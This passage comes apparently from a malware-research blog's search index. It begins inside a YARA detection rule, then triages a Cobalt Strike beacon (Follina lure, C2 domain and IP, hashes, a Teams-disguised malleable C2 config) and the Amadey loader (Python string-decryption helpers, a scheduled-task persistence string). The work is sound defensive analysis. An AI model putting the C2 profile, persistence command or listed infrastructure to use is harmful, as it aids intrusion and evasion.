A7 A3 A7 A5 A7 A3 ?? ?? ?? ?? A7 A2 A7 A6 A7 A5 ?? ?? } $s168 = { A8 A9 A8 A9 A8 AA ?? ?? A8 AA A8 A9 A8 AA ?? ?? A8 AB A8 AA A8 AC ?? ?? ?? ?? A8 AC A8 AA A8 AC ?? ?? ?? ?? A8 AD A8 A9 A8 AA ?? ?? } $s169 = { A9 A8 A9 A8 A9 AB ?? ?? A9 AB A9 A8 A9 AB ?? ?? A9 AA A9 AB A9 AD ?? ?? ?? ?? A9 AD A9 AB A9 AD ?? ?? ?? ?? A9 AC A9 A8 A9 AB ?? ?? } $s170 = { AA AB AA AB AA A8 ?? ?? AA A8 AA AB AA A8 ?? ?? AA A9 AA A8 AA AE ?? ?? ?? ?? AA AE AA A8 AA AE ?? ?? ?? ?? AA AF AA AB AA A8 ?? ?? } $s171 = { AB AA AB AA AB A9 ?? ?? AB A9 AB AA AB A9 ?? ?? AB A8 AB A9 AB AF ?? ?? ?? ?? AB AF AB A9 AB AF ?? ?? ?? ?? AB AE AB AA AB A9 ?? ?? } $s172 = { AC AD AC AD AC AE ?? ?? AC AE AC AD AC AE ?? ?? AC AF AC AE AC A8 ?? ?? ?? ?? AC A8 AC AE AC A8 ?? ?? ?? ?? AC A9 AC AD AC AE ?? ?? } $s173 = { AD AC AD AC AD AF ?? ?? AD AF AD AC AD AF ?? ?? AD AE AD AF AD A9 ?? ?? ?? ?? AD A9 AD AF AD A9 ?? ?? ?? ?? AD A8 AD AC AD AF ?? ?? } $s174 = { AE AF AE AF AE AC ?? ?? AE AC AE AF AE AC ?? ?? AE AD AE AC AE AA ?? ?? ?? ?? AE AA AE AC AE AA ?? ?? ?? ?? AE AB AE AF AE AC ?? ?? } $s175 = { AF AE AF AE AF AD ?? ?? AF AD AF AE AF AD ?? ?? AF AC AF AD AF AB ?? ?? ?? ?? AF AB AF AD AF AB ?? ?? ?? ?? AF AA AF AE AF AD ?? ?? } $s176 = { B0 B1 B0 B1 B0 B2 ?? ?? B0 B2 B0 B1 B0 B2 ?? ?? B0 B3 B0 B2 B0 B4 ?? ?? ?? ?? B0 B4 B0 B2 B0 B4 ?? ?? ?? ?? B0 B5 B0 B1 B0 B2 ?? ?? } $s177 = { B1 B0 B1 B0 B1 B3 ?? ?? B1 B3 B1 B0 B1 B3 ?? ?? B1 B2 B1 B3 B1 B5 ?? ?? ?? ?? B1 B5 B1 B3 B1 B5 ?? ?? ?? ?? B1 B4 B1 B0 B1 B3 ?? ?? } $s178 = { B2 B3 B2 B3 B2 B0 ?? ?? B2 B0 B2 B3 B2 B0 ?? ?? B2 B1 B2 B0 B2 B6 ?? ?? ?? ?? B2 B6 B2 B0 B2 B6 ?? ?? ?? ?? B2 B7 B2 B3 B2 B0 ?? ?? } $s179 = { B3 B2 B3 B2 B3 B1 ?? ?? B3 B1 B3 B2 B3 B1 ?? ?? B3 B0 B3 B1 B3 B7 ?? ?? ?? ?? B3 B7 B3 B1 B3 B7 ?? ?? ?? ?? B3 B6 B3 B2 B3 B1 ?? ?? } $s180 = { B4 B5 B4 B5 B4 B6 ?? ?? B4 B6 B4 B5 B4 B6 ?? ?? B4 B7 B4 B6 B4 B0 ?? ?? ?? ?? B4 B0 B4 B6 B4 B0 ?? ?? ?? ?? B4 B1 B4 B5 B4 B6 ?? ?? } $s181 = { B5 B4 B5 B4 B5 B7 ?? ?? B5 B7 B5 B4 B5 B7 ?? ?? B5 B6 B5 B7 B5 B1 ?? ?? ?? ?? B5 B1 B5 B7 B5 B1 ?? ?? ?? ?? B5 B0 B5 B4 B5 B7 ?? ?? } $s182 = { B6 B7 B6 B7 B6 B4 ?? ?? B6 B4 B6 B7 B6 B4 ?? ?? B6 B5 B6 B4 B6 B2 ?? ?? ?? ?? B6 B2 B6 B4 B6 B2 ?? ?? ?? ?? B6 B3 B6 B7 B6 B4 ?? ?? } $s183 = { B7 B6 B7 B6 B7 B5 ?? ?? B7 B5 B7 B6 B7 B5 ?? ?? B7 B4 B7 B5 B7 B3 ?? ?? ?? ?? B7 B3 B7 B5 B7 B3 ?? ?? ?? ?? B7 B2 B7 B6 B7 B5 ?? ?? } $s184 = { B8 B9 B8 B9 B8 BA ?? ?? B8 BA B8 B9 B8 BA ?? ?? B8 BB B8 BA B8 BC ?? ?? ?? ?? B8 BC B8 BA B8 BC ?? ?? ?? ?? B8 BD B8 B9 B8 BA ?? ?? } $s185 = { B9 B8 B9 B8 B9 BB ?? ?? B9 BB B9 B8 B9 BB ?? ?? B9 BA B9 BB B9 BD ?? ?? ?? ?? B9 BD B9 BB B9 BD ?? ?? ?? ?? B9 BC B9 B8 B9 BB ?? ?? } $s186 = { BA BB BA BB BA B8 ?? ?? BA B8 BA BB BA B8 ?? ?? BA B9 BA B8 BA BE ?? ?? ?? ?? BA BE BA B8 BA BE ?? ?? ?? ?? BA BF BA BB BA B8 ?? ?? } $s187 = { BB BA BB BA BB B9 ?? ?? BB B9 BB BA BB B9 ?? ?? BB B8 BB B9 BB BF ?? ?? ?? ?? BB BF BB B9 BB BF ?? ?? ?? ?? BB BE BB BA BB B9 ?? ?? } $s188 = { BC BD BC BD BC BE ?? ?? BC BE BC BD BC BE ?? ?? BC BF BC BE BC B8 ?? ?? ?? ?? BC B8 BC BE BC B8 ?? ?? ?? ?? BC B9 BC BD BC BE ?? ?? } $s189 = { BD BC BD BC BD BF ?? ?? BD BF BD BC BD BF ?? ?? BD BE BD BF BD B9 ?? ?? ?? ?? BD B9 BD BF BD B9 ?? ?? ?? ?? BD B8 BD BC BD BF ?? ?? } $s190 = { BE BF BE BF BE BC ?? ?? BE BC BE BF BE BC ?? ?? BE BD BE BC BE BA ?? ?? ?? ?? BE BA BE BC BE BA ?? ?? ?? ?? BE BB BE BF BE BC ?? ?? } $s191 = { BF BE BF BE BF BD ?? ?? BF BD BF BE BF BD ?? ?? BF BC BF BD BF BB ?? ?? ?? ?? BF BB BF BD BF BB ?? ?? ?? ?? BF BA BF BE BF BD ?? ?? } $s192 = { C0 C1 C0 C1 C0 C2 ?? ?? C0 C2 C0 C1 C0 C2 ?? ?? C0 C3 C0 C2 C0 C4 ?? ?? ?? ?? C0 C4 C0 C2 C0 C4 ?? ?? ?? ?? C0 C5 C0 C1 C0 C2 ?? ?? } $s193 = { C1 C0 C1 C0 C1 C3 ?? ?? C1 C3 C1 C0 C1 C3 ?? ?? C1 C2 C1 C3 C1 C5 ?? ?? ?? ?? C1 C5 C1 C3 C1 C5 ?? ?? ?? ?? C1 C4 C1 C0 C1 C3 ?? ?? } $s194 = { C2 C3 C2 C3 C2 C0 ?? ?? C2 C0 C2 C3 C2 C0 ?? ?? C2 C1 C2 C0 C2 C6 ?? ?? ?? ?? C2 C6 C2 C0 C2 C6 ?? ?? ?? ?? C2 C7 C2 C3 C2 C0 ?? ?? } $s195 = { C3 C2 C3 C2 C3 C1 ?? ?? C3 C1 C3 C2 C3 C1 ?? ?? C3 C0 C3 C1 C3 C7 ?? ?? ?? ?? C3 C7 C3 C1 C3 C7 ?? ?? ?? ?? C3 C6 C3 C2 C3 C1 ?? ?? } $s196 = { C4 C5 C4 C5 C4 C6 ?? ?? C4 C6 C4 C5 C4 C6 ?? ?? C4 C7 C4 C6 C4 C0 ?? ?? ?? ?? C4 C0 C4 C6 C4 C0 ?? ?? ?? ?? C4 C1 C4 C5 C4 C6 ?? ?? } $s197 = { C5 C4 C5 C4 C5 C7 ?? ?? C5 C7 C5 C4 C5 C7 ?? ?? C5 C6 C5 C7 C5 C1 ?? ?? ?? ?? C5 C1 C5 C7 C5 C1 ?? ?? ?? ?? C5 C0 C5 C4 C5 C7 ?? ?? } $s198 = { C6 C7 C6 C7 C6 C4 ?? ?? C6 C4 C6 C7 C6 C4 ?? ?? C6 C5 C6 C4 C6 C2 ?? ?? ?? ?? C6 C2 C6 C4 C6 C2 ?? ?? ?? ?? C6 C3 C6 C7 C6 C4 ?? ?? } $s199 = { C7 C6 C7 C6 C7 C5 ?? ?? C7 C5 C7 C6 C7 C5 ?? ?? C7 C4 C7 C5 C7 C3 ?? ?? ?? ?? C7 C3 C7 C5 C7 C3 ?? ?? ?? ?? C7 C2 C7 C6 C7 C5 ?? ?? } $s200 = { C8 C9 C8 C9 C8 CA ?? ?? C8 CA C8 C9 C8 CA ?? ?? C8 CB C8 CA C8 CC ?? ?? ?? ?? C8 CC C8 CA C8 CC ?? ?? ?? ?? C8 CD C8 C9 C8 CA ?? ?? } $s201 = { C9 C8 C9 C8 C9 CB ?? ?? C9 CB C9 C8 C9 CB ?? ?? C9 CA C9 CB C9 CD ?? ?? ?? ?? C9 CD C9 CB C9 CD ?? ?? ?? ?? C9 CC C9 C8 C9 CB ?? ?? } $s202 = { CA CB CA CB CA C8 ?? ?? CA C8 CA CB CA C8 ?? ?? CA C9 CA C8 CA CE ?? ?? ?? ?? CA CE CA C8 CA CE ?? ?? ?? ?? CA CF CA CB CA C8 ?? ?? } $s203 = { CB CA CB CA CB C9 ?? ?? CB C9 CB CA CB C9 ?? ?? CB C8 CB C9 CB CF ?? ?? ?? ?? CB CF CB C9 CB CF ?? ?? ?? ?? CB CE CB CA CB C9 ?? ?? } $s204 = { CC CD CC CD CC CE ?? ?? CC CE CC CD CC CE ?? ?? CC CF CC CE CC C8 ?? ?? ?? ?? CC C8 CC CE CC C8 ?? ?? ?? ?? CC C9 CC CD CC CE ?? ?? } $s205 = { CD CC CD CC CD CF ?? ?? CD CF CD CC CD CF ?? ?? CD CE CD CF CD C9 ?? ?? ?? ?? CD C9 CD CF CD C9 ?? ?? ?? ?? CD C8 CD CC CD CF ?? ?? } $s206 = { CE CF CE CF CE CC ?? ?? CE CC CE CF CE CC ?? ?? CE CD CE CC CE CA ?? ?? ?? ?? CE CA CE CC CE CA ?? ?? ?? ?? CE CB CE CF CE CC ?? ?? } $s207 = { CF CE CF CE CF CD ?? ?? CF CD CF CE CF CD ?? ?? CF CC CF CD CF CB ?? ?? ?? ?? CF CB CF CD CF CB ?? ?? ?? ?? CF CA CF CE CF CD ?? ?? } $s208 = { D0 D1 D0 D1 D0 D2 ?? ?? D0 D2 D0 D1 D0 D2 ?? ?? D0 D3 D0 D2 D0 D4 ?? ?? ?? ?? D0 D4 D0 D2 D0 D4 ?? ?? ?? ?? D0 D5 D0 D1 D0 D2 ?? ?? } $s209 = { D1 D0 D1 D0 D1 D3 ?? ?? D1 D3 D1 D0 D1 D3 ?? ?? D1 D2 D1 D3 D1 D5 ?? ?? ?? ?? D1 D5 D1 D3 D1 D5 ?? ?? ?? ?? D1 D4 D1 D0 D1 D3 ?? ?? } $s210 = { D2 D3 D2 D3 D2 D0 ?? ?? D2 D0 D2 D3 D2 D0 ?? ?? D2 D1 D2 D0 D2 D6 ?? ?? ?? ?? D2 D6 D2 D0 D2 D6 ?? ?? ?? ?? D2 D7 D2 D3 D2 D0 ?? ?? } $s211 = { D3 D2 D3 D2 D3 D1 ?? ?? D3 D1 D3 D2 D3 D1 ?? ?? D3 D0 D3 D1 D3 D7 ?? ?? ?? ?? D3 D7 D3 D1 D3 D7 ?? ?? ?? ?? D3 D6 D3 D2 D3 D1 ?? ?? } $s212 = { D4 D5 D4 D5 D4 D6 ?? ?? D4 D6 D4 D5 D4 D6 ?? ?? D4 D7 D4 D6 D4 D0 ?? ?? ?? ?? D4 D0 D4 D6 D4 D0 ?? ?? ?? ?? D4 D1 D4 D5 D4 D6 ?? ?? } $s213 = { D5 D4 D5 D4 D5 D7 ?? ?? D5 D7 D5 D4 D5 D7 ?? ?? D5 D6 D5 D7 D5 D1 ?? ?? ?? ?? D5 D1 D5 D7 D5 D1 ?? ?? ?? ?? D5 D0 D5 D4 D5 D7 ?? ?? } $s214 = { D6 D7 D6 D7 D6 D4 ?? ?? D6 D4 D6 D7 D6 D4 ?? ?? D6 D5 D6 D4 D6 D2 ?? ?? ?? ?? D6 D2 D6 D4 D6 D2 ?? ?? ?? ?? D6 D3 D6 D7 D6 D4 ?? ?? } $s215 = { D7 D6 D7 D6 D7 D5 ?? ?? D7 D5 D7 D6 D7 D5 ?? ?? D7 D4 D7 D5 D7 D3 ?? ?? ?? ?? D7 D3 D7 D5 D7 D3 ?? ?? ?? ?? D7 D2 D7 D6 D7 D5 ?? ?? } $s216 = { D8 D9 D8 D9 D8 DA ?? ?? D8 DA D8 D9 D8 DA ?? ?? D8 DB D8 DA D8 DC ?? ?? ?? ?? D8 DC D8 DA D8 DC ?? ?? ?? ?? D8 DD D8 D9 D8 DA ?? ?? } $s217 = { D9 D8 D9 D8 D9 DB ?? ?? D9 DB D9 D8 D9 DB ?? ?? D9 DA D9 DB D9 DD ?? ?? ?? ?? D9 DD D9 DB D9 DD ?? ?? ?? ?? D9 DC D9 D8 D9 DB ?? ?? } $s218 = { DA DB DA DB DA D8 ?? ?? DA D8 DA DB DA D8 ?? ?? DA D9 DA D8 DA DE ?? ?? ?? ?? DA DE DA D8 DA DE ?? ?? ?? ?? DA DF DA DB DA D8 ?? ?? } $s219 = { DB DA DB DA DB D9 ?? ?? DB D9 DB DA DB D9 ?? ?? DB D8 DB D9 DB DF ?? ?? ?? ?? DB DF DB D9 DB DF ?? ?? ?? ?? DB DE DB DA DB D9 ?? ?? } $s220 = { DC DD DC DD DC DE ?? ?? DC DE DC DD DC DE ?? ?? DC DF DC DE DC D8 ?? ?? ?? ?? DC D8 DC DE DC D8 ?? ?? ?? ?? DC D9 DC DD DC DE ?? ?? } $s221 = { DD DC DD DC DD DF ?? ?? DD DF DD DC DD DF ?? ?? DD DE DD DF DD D9 ?? ?? ?? ?? DD D9 DD DF DD D9 ?? ?? ?? ?? DD D8 DD DC DD DF ?? ?? } $s222 = { DE DF DE DF DE DC ?? ?? DE DC DE DF DE DC ?? ?? DE DD DE DC DE DA ?? ?? ?? ?? DE DA DE DC DE DA ?? ?? ?? ?? DE DB DE DF DE DC ?? ?? } $s223 = { DF DE DF DE DF DD ?? ?? DF DD DF DE DF DD ?? ?? DF DC DF DD DF DB ?? ?? ?? ?? DF DB DF DD DF DB ?? ?? ?? ?? DF DA DF DE DF DD ?? ?? } $s224 = { E0 E1 E0 E1 E0 E2 ?? ?? E0 E2 E0 E1 E0 E2 ?? ?? E0 E3 E0 E2 E0 E4 ?? ?? ?? ?? E0 E4 E0 E2 E0 E4 ?? ?? ?? ?? E0 E5 E0 E1 E0 E2 ?? ?? } $s225 = { E1 E0 E1 E0 E1 E3 ?? ?? E1 E3 E1 E0 E1 E3 ?? ?? E1 E2 E1 E3 E1 E5 ?? ?? ?? ?? E1 E5 E1 E3 E1 E5 ?? ?? ?? ?? E1 E4 E1 E0 E1 E3 ?? ?? } $s226 = { E2 E3 E2 E3 E2 E0 ?? ?? E2 E0 E2 E3 E2 E0 ?? ?? E2 E1 E2 E0 E2 E6 ?? ?? ?? ?? E2 E6 E2 E0 E2 E6 ?? ?? ?? ?? E2 E7 E2 E3 E2 E0 ?? ?? } $s227 = { E3 E2 E3 E2 E3 E1 ?? ?? E3 E1 E3 E2 E3 E1 ?? ?? E3 E0 E3 E1 E3 E7 ?? ?? ?? ?? E3 E7 E3 E1 E3 E7 ?? ?? ?? ?? E3 E6 E3 E2 E3 E1 ?? ?? } $s228 = { E4 E5 E4 E5 E4 E6 ?? ?? E4 E6 E4 E5 E4 E6 ?? ?? E4 E7 E4 E6 E4 E0 ?? ?? ?? ?? E4 E0 E4 E6 E4 E0 ?? ?? ?? ?? E4 E1 E4 E5 E4 E6 ?? ?? } $s229 = { E5 E4 E5 E4 E5 E7 ?? ?? E5 E7 E5 E4 E5 E7 ?? ?? E5 E6 E5 E7 E5 E1 ?? ?? ?? ?? E5 E1 E5 E7 E5 E1 ?? ?? ?? ?? E5 E0 E5 E4 E5 E7 ?? ?? } $s230 = { E6 E7 E6 E7 E6 E4 ?? ?? E6 E4 E6 E7 E6 E4 ?? ?? E6 E5 E6 E4 E6 E2 ?? ?? ?? ?? E6 E2 E6 E4 E6 E2 ?? ?? ?? ?? E6 E3 E6 E7 E6 E4 ?? ?? } $s231 = { E7 E6 E7 E6 E7 E5 ?? ?? E7 E5 E7 E6 E7 E5 ?? ?? E7 E4 E7 E5 E7 E3 ?? ?? ?? ?? E7 E3 E7 E5 E7 E3 ?? ?? ?? ?? E7 E2 E7 E6 E7 E5 ?? ?? } $s232 = { E8 E9 E8 E9 E8 EA ?? ?? E8 EA E8 E9 E8 EA ?? ?? E8 EB E8 EA E8 EC ?? ?? ?? ?? E8 EC E8 EA E8 EC ?? ?? ?? ?? E8 ED E8 E9 E8 EA ?? ?? } $s233 = { E9 E8 E9 E8 E9 EB ?? ?? E9 EB E9 E8 E9 EB ?? ?? E9 EA E9 EB E9 ED ?? ?? ?? ?? E9 ED E9 EB E9 ED ?? ?? ?? ?? E9 EC E9 E8 E9 EB ?? ?? } $s234 = { EA EB EA EB EA E8 ?? ?? EA E8 EA EB EA E8 ?? ?? EA E9 EA E8 EA EE ?? ?? ?? ?? EA EE EA E8 EA EE ?? ?? ?? ?? EA EF EA EB EA E8 ?? ?? } $s235 = { EB EA EB EA EB E9 ?? ?? EB E9 EB EA EB E9 ?? ?? EB E8 EB E9 EB EF ?? ?? ?? ?? EB EF EB E9 EB EF ?? ?? ?? ?? EB EE EB EA EB E9 ?? ?? } $s236 = { EC ED EC ED EC EE ?? ?? EC EE EC ED EC EE ?? ?? EC EF EC EE EC E8 ?? ?? ?? ?? EC E8 EC EE EC E8 ?? ?? ?? ?? EC E9 EC ED EC EE ?? ?? } $s237 = { ED EC ED EC ED EF ?? ?? ED EF ED EC ED EF ?? ?? ED EE ED EF ED E9 ?? ?? ?? ?? ED E9 ED EF ED E9 ?? ?? ?? ?? ED E8 ED EC ED EF ?? ?? } $s238 = { EE EF EE EF EE EC ?? ?? EE EC EE EF EE EC ?? ?? EE ED EE EC EE EA ?? ?? ?? ?? EE EA EE EC EE EA ?? ?? ?? ?? EE EB EE EF EE EC ?? ?? } $s239 = { EF EE EF EE EF ED ?? ?? EF ED EF EE EF ED ?? ?? EF EC EF ED EF EB ?? ?? ?? ?? EF EB EF ED EF EB ?? ?? ?? ?? EF EA EF EE EF ED ?? ?? } $s240 = { F0 F1 F0 F1 F0 F2 ?? ?? F0 F2 F0 F1 F0 F2 ?? ?? F0 F3 F0 F2 F0 F4 ?? ?? ?? ?? F0 F4 F0 F2 F0 F4 ?? ?? ?? ?? F0 F5 F0 F1 F0 F2 ?? ?? } $s241 = { F1 F0 F1 F0 F1 F3 ?? ?? F1 F3 F1 F0 F1 F3 ?? ?? F1 F2 F1 F3 F1 F5 ?? ?? ?? ?? F1 F5 F1 F3 F1 F5 ?? ?? ?? ?? F1 F4 F1 F0 F1 F3 ?? ?? } $s242 = { F2 F3 F2 F3 F2 F0 ?? ?? F2 F0 F2 F3 F2 F0 ?? ?? F2 F1 F2 F0 F2 F6 ?? ?? ?? ?? F2 F6 F2 F0 F2 F6 ?? ?? ?? ?? F2 F7 F2 F3 F2 F0 ?? ?? } $s243 = { F3 F2 F3 F2 F3 F1 ?? ?? F3 F1 F3 F2 F3 F1 ?? ?? F3 F0 F3 F1 F3 F7 ?? ?? ?? ?? F3 F7 F3 F1 F3 F7 ?? ?? ?? ?? F3 F6 F3 F2 F3 F1 ?? ?? } $s244 = { F4 F5 F4 F5 F4 F6 ?? ?? F4 F6 F4 F5 F4 F6 ?? ?? F4 F7 F4 F6 F4 F0 ?? ?? ?? ?? F4 F0 F4 F6 F4 F0 ?? ?? ?? ?? F4 F1 F4 F5 F4 F6 ?? ?? } $s245 = { F5 F4 F5 F4 F5 F7 ?? ?? F5 F7 F5 F4 F5 F7 ?? ?? F5 F6 F5 F7 F5 F1 ?? ?? ?? ?? F5 F1 F5 F7 F5 F1 ?? ?? ?? ?? F5 F0 F5 F4 F5 F7 ?? ?? } $s246 = { F6 F7 F6 F7 F6 F4 ?? ?? F6 F4 F6 F7 F6 F4 ?? ?? F6 F5 F6 F4 F6 F2 ?? ?? ?? ?? F6 F2 F6 F4 F6 F2 ?? ?? ?? ?? F6 F3 F6 F7 F6 F4 ?? ?? } $s247 = { F7 F6 F7 F6 F7 F5 ?? ?? F7 F5 F7 F6 F7 F5 ?? ?? F7 F4 F7 F5 F7 F3 ?? ?? ?? ?? F7 F3 F7 F5 F7 F3 ?? ?? ?? ?? F7 F2 F7 F6 F7 F5 ?? ?? } $s248 = { F8 F9 F8 F9 F8 FA ?? ?? F8 FA F8 F9 F8 FA ?? ?? F8 FB F8 FA F8 FC ?? ?? ?? ?? F8 FC F8 FA F8 FC ?? ?? ?? ?? F8 FD F8 F9 F8 FA ?? ?? } $s249 = { F9 F8 F9 F8 F9 FB ?? ?? F9 FB F9 F8 F9 FB ?? ?? F9 FA F9 FB F9 FD ?? ?? ?? ?? F9 FD F9 FB F9 FD ?? ?? ?? ?? F9 FC F9 F8 F9 FB ?? ?? } $s250 = { FA FB FA FB FA F8 ?? ?? FA F8 FA FB FA F8 ?? ?? FA F9 FA F8 FA FE ?? ?? ?? ?? FA FE FA F8 FA FE ?? ?? ?? ?? FA FF FA FB FA F8 ?? ?? } $s251 = { FB FA FB FA FB F9 ?? ?? FB F9 FB FA FB F9 ?? ?? FB F8 FB F9 FB FF ?? ?? ?? ?? FB FF FB F9 FB FF ?? ?? ?? ?? FB FE FB FA FB F9 ?? ?? } $s252 = { FC FD FC FD FC FE ?? ?? FC FE FC FD FC FE ?? ?? FC FF FC FE FC F8 ?? ?? ?? ?? FC F8 FC FE FC F8 ?? ?? ?? ?? FC F9 FC FD FC FE ?? ?? } $s253 = { FD FC FD FC FD FF ?? ?? FD FF FD FC FD FF ?? ?? FD FE FD FF FD F9 ?? ?? ?? ?? FD F9 FD FF FD F9 ?? ?? ?? ?? FD F8 FD FC FD FF ?? ?? } $s254 = { FE FF FE FF FE FC ?? ?? FE FC FE FF FE FC ?? ?? FE FD FE FC FE FA ?? ?? ?? ?? FE FA FE FC FE FA ?? ?? ?? ?? FE FB FE FF FE FC ?? ?? } $s255 = { FF FE FF FE FF FD ?? ?? FF FD FF FE FF FD ?? ?? FF FC FF FD FF FB ?? ?? ?? ?? FF FB FF FD FF FB ?? ?? ?? ?? FF FA FF FE FF FD ?? ?? } $fp1 = &quot;ICSharpCode.Decompiler&quot; wide condition: any of ($s*) and not 1 of ($fp*) } . Packed Cobalt Strike Beacon Triage . This sample was reccomended, and it was linked (overlapping C2) to a similar sample triaged on Twitter by the @malwrhunterteam. Interesting &quot;VIP Invitation to Doha Expo 2023.docx&quot;: 6b06af3d20fd4f35fe62151d45e4344314d26b68d886d80ad6d8a375820247cfhttps://files.attend-doha-expo[.]com/inv.html Use webdav to get payload after Follina exploit: 5.206.224[.]233 webdav Related opendir: http://5.206.224[.]233/ pic.twitter.com/5PjS5AAPJs . &mdash; MalwareHunterTeam (@malwrhunterteam) June 1, 2022 . The packed PE payload is 083d27a598e1a4c93dc8a9b446ca95c4c7b7b8f2e5fc2f6020b162ead8c91bdf which masquerades as OSD_Sidekick.exe. . Unpacking . When we first ran the sample in x64dbg it terminated with no observed behaviour. Initially I suspected this was due to some ant-debug features but then it was pointed out that they were using direct syscalls to evade API monitoring (breakpoints on VirutalAllocateEx). . . Syscalls . Since syscall numbers vary by OS version they cannot be hard-coded. The packer implemented a simple API hashing algorithm that was used to lookup the syscall number befor using it. We used HashDB to decode these API hashes. . import requests HASHDB_HUNT_URL = &#39;https://hashdb.openanalysis.net/hunt&#39; HASHDB_HASH_URL = &#39;https://hashdb.openanalysis.net/hash&#39; api_hash = 572265531 hunt_request = {&quot;hashes&quot;: [572265531]} r = requests.post(HASHDB_HUNT_URL, json=hunt_request) print(r.json()) . {&#39;hits&#39;: [{&#39;algorithm&#39;: &#39;add1501_shl5&#39;, &#39;count&#39;: 1, &#39;hitrate&#39;: 1.0}]} . r = requests.get(HASHDB_HASH_URL + &#39;/add1501_shl5/&#39; + str(api_hash)) print(r.json()) . {&#39;hashes&#39;: [{&#39;hash&#39;: 572265531, &#39;string&#39;: {&#39;string&#39;: &#39;ZwAllocateVirtualMemory&#39;, &#39;is_api&#39;: True, &#39;permutation&#39;: &#39;api&#39;, &#39;api&#39;: &#39;ZwAllocateVirtualMemory&#39;, &#39;modules&#39;: [&#39;ntdll&#39;]}}]} . Unpacked Payload . Once we decodede the syscalls they led us to a familliar set of APIs... . ZwAllocateVirtualMemory | ZwGetContextThread | ZwProtectVirtualMemory | ZwResumeThread | ZwSetContextThread | ZwTerminateProcess | ZwWriteVirtualMemory | . Adding breakpoints on these syscalls led us to discover and CobaltStrike PE payload that had been embeded in the .text section of the packed PE and was decrypted in place. Before the payload could be mapped and executed it we dumped it: e596a17260e6e5ec4c5d2160a6d645cdefb7a4bbe57efc7a5c963ad677cd98f6. . Beacon Config . Once the payload was dumped we used the Sentinal-One CS beacon config extractor to pull the following config. . BeaconType - HTTPS Port - 443 SleepTime - 60000 MaxGetSize - 2097328 Jitter - 20 PublicKey_MD5 - 3c12281e9b883260fd0af24adb44cb94 C2Server - www.telecomly.info,/Collector/2.0/settings/ UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.4.00.2879 Chrome/80.0.3987.165 Electron/8.5.1 Safari/537.36 HttpPostUri - /users/8:orgid:c2811-b2a4-2b33-3be12bad1/endpoints/events/poll Malleable_C2_Instructions - Remove 46 bytes from the end Remove 130 bytes from the beginning NetBIOS decode &#39;a&#39; HttpGet_Metadata - ConstHeaders Accept: json Host: westeurope-teams.azureedge.net Referer: https://teams.microsoft.com/_ x-ms-session-id: b4421c12-21a3-b771-c112-f11bf11a127b x-ms-client-type: desktop x-mx-client-version: 27/1.0.0.2021020410 Accept-Encoding: gzip, deflate, br Origin: https://teams.microsoft.com ConstParams qsp=true client-id=NO_AUTH sdk-version=ACT-Web-JS-2.5.0&amp; Metadata base64url parameter &quot;events&quot; HttpPost_Metadata - ConstHeaders Accept: json Host: westeurope-teams.azureedge.net Referer: https://teams.microsoft.com/_ x-ms-query-params: cursor=1312212112&amp;epfs=srt&amp;sca=5&amp;activeTimeout=135 x-ms-client-type: desktop x-mx-client-version: 27/1.0.0.2021020410 Accept-Encoding: gzip, deflate, br Origin: https://teams.microsoft SessionId netbios prepend &quot;b83d5243-176b-b887-1d36-&quot; header &quot;x-ms-session-id&quot; Output base64 prepend &quot;skypetoken=eyJhdFba1e&quot; header &quot;Authentication&quot; HttpGet_Verb - GET HttpPost_Verb - GET HttpPostChunk - 96 Spawnto_x86 - %windir% syswow64 werfault.exe Spawnto_x64 - %windir% sysnative werfault.exe CryptoScheme - 0 Proxy_Behavior - Use IE settings Watermark_Hash - XjowzohquO5k0WW/OtRHVw== Watermark - 123456789 bStageCleanup - False bCFGCaution - False KillDate - 0 bProcInject_StartRWX - False bProcInject_UseRWX - False bProcInject_MinAllocSize - 17500 ProcInject_PrependAppend_x86 - b&#39; x90 x90&#39; Empty ProcInject_PrependAppend_x64 - b&#39; x90 x90&#39; Empty ProcInject_Execute - ntdll:RtlUserThreadStart CreateThread NtQueueApcThread-s CreateRemoteThread RtlCreateUserThread ProcInject_AllocationMethod - NtMapViewOfSection bUsesCookies - False DNS_strategy - round-robin DNS_strategy_rotate_seconds - -1 DNS_strategy_fail_x - -1 DNS_strategy_fail_seconds - -1 Retry_Max_Attempts - 0 Retry_Increase_Attempts - 0 Retry_Duration - 0 .",
            "url": "https://research.openanalysis.net/emulation/dumpulator/cobaltstrike/config/2022/06/09/cobaltstrike.html",
            "relUrl": "/emulation/dumpulator/cobaltstrike/config/2022/06/09/cobaltstrike.html",
            "date": " • Jun 9, 2022"
        }
        
    
  
    
        ,"post5": {
            "title": "Triage Amadey Loader",
            "content": "Overview . Unknown sample from MalwareBazaar. Some of the sandbox tags labeled it as amadey, we are going to validate this. . Samples . Packed Sample: 7ff0ff6e51a58398ad73da3cc8e7e6233a23e49d93aaa4b190672e4f9f08b9bb | Unpacked Sample: 6e01f9d1997186d06274a508bc0a511aa6fb50e430b77efca593c00d3fc62cba | . References . ANY.RUN detects as amadey | Intezer detects as deyma | JoeSandbox detects as amadey | Hatching detects as amadey | Analyzing Amadey Loader | . According to Malpedia . Amadey is a botnet that appeared around October 2018 and is being sold for about 500$ on Russian-speaking hacking forums. It periodically sends information about the system and installed AV software to its C2 server and polls to receive orders from it. Its main functionality is that it can load other payloads (called &quot;tasks&quot;) for all or specifically targeted computers compromised by the malware. . Analysis . Artifacts . PDB string D: Mktmp NL1 Release NL1.pdb | Compiled with Microsoft Visual C/C++ | . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . key_buff = b&#39;6768875d0dd576a718d85aa1d71d25c1 x00&#39; data_buff = b&#39;6679AA9D98A9C95093B7785783AA85868CA95864AEB051955760B88055&#39; out = [] def decrypt_string(data, key): data = unhex(data) key = key[1:] out = [] for i in range(len(data)): out.append((data[i] - key[i % len(key)]) &amp; 0xff) return bytes(out) print(decrypt_string(data_buff, key_buff)) . b&#39;/Create /SC MINUTE /MO 1 /TN &#39; . import re FILE_PATH = &#39;/tmp/amadey_unpacked.bin&#39; data = open(FILE_PATH, &#39;rb&#39;).read() def get_strings(): string_egg = rb&#39;(([A-F0-9]{2}){4,}) x00&#39; enc_strings = [] for m in re.finditer(string_egg, data): enc_str = m.group(1) enc_strings.append(enc_str) return enc_strings def get_keys(): key_egg = rb&#39;([a-f0-9]{2}){8,} x00&#39; keys = [] for m in re.finditer(key_egg, data): key_str = m.group(0) keys.append(key_str) return keys . 